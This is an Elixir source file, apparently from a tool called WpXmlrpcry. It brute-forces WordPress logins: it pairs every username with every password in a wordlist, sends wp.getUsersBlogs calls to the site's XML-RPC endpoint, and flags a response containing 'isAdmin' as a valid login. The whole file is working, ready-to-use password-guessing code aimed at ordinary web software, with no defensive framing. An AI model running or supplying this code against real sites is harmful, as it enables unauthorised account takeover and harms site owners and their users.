defmodule WpXmlrpcry.Worker do

  alias WpXmlrpcry.{Http, Report}

  @pattern ~r/isAdmin/i

  def start(progress_channel, [url: url, users: users, wordlist: wordlist]) do
    result =
      combine_user_pass(users, wordlist)
      |> do_login(url, [])
      |> Report.show_result_statistics(url)

    send(progress_channel, result)
  end

  def do_login([%{username: user, password: pass} | user_and_pass], url, acc) do
    ret =
      with payload <- generate_payload(username: user, password: pass),
        {:ok, response} <- Http.post(url, payload),
        parsed_body <- Http.extract_body(response),
        true <- Http.text_in_body?(parsed_body, @pattern) do
          %{username: user, password: pass, success: true}
      else
        _ ->
          %{username: user, password: pass, success: false}
      end

    do_login(user_and_pass, url, [ret | acc])
  end
  def do_login([], _url, acc), do: acc

  def generate_payload(username: u, password: p) do
    """
    <methodCall>
      <methodName>wp.getUsersBlogs</methodName>
      <params>
        <param><value><string>#{u}</string></value></param>
        <param><value><string>#{p}</string></value></param>
      </params>
    </methodCall>
    """
  end

  def combine_user_pass(user, passwords) when is_binary(user), do: combine_user_pass([user], passwords)
  def combine_user_pass(users, passwords) do
    for user <- users, password <- passwords, do: %{username: user, password: password}
  end
end
